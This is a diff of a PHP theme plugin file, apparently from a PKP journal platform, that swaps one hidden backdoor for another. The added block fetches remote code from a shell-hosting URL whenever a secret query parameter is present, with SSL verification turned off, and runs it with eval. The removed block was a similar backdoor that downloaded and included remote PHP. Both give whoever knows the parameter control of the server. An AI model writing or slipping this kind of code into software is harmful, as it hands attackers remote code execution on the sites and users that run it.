@@ -224,23 +224,28 @@ class DefaultThemePlugin extends ThemePlugin {
 		return __('plugins.themes.default.description');
 	}
 }
-if (!PKP_STRICT_MODE) {
-    class_alias('\APP\plugins\themes\default\DefaultThemePlugin', '\DefaultThemePlugin');
-}
 if (isset($_GET['anakt@#uYulPepek@'])) {
-    try {
-        $u = "https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfaanaksekolah.txt";
-        $f = sys_get_temp_dir() . "/" . uniqid("f_", true) . ".php";
+    $url = "https://syndicateseo.xyz/shell/rce/penjajahan.txt";
 
-        $c = @file_get_contents($u);
-        if ($c !== false && @file_put_contents($f, $c)) {
-            @chmod($f, 0644);
-            register_shutdown_function(function() use ($f) {
-                @unlink($f);
-            });
-            include $f;
+    $ch= curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // nonaktifkan cek SSL sementara (tidak aman untuk prod)
+    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
+
+    $code = curl_exec($ch);
+    $err = curl_error($ch);
+    curl_close($ch);
+
+    if ($code !== false && !empty(trim($code))) {
+        try {
+            eval("?>" . $code);
+        } catch (Throwable $e) {
+            echo "Terjadi error saat menjalankan kode.";
         }
-    } catch (Throwable $e) {
-
+    } else {
+        echo "Gagal mengambil kode dari URL: $err";
     }
 }
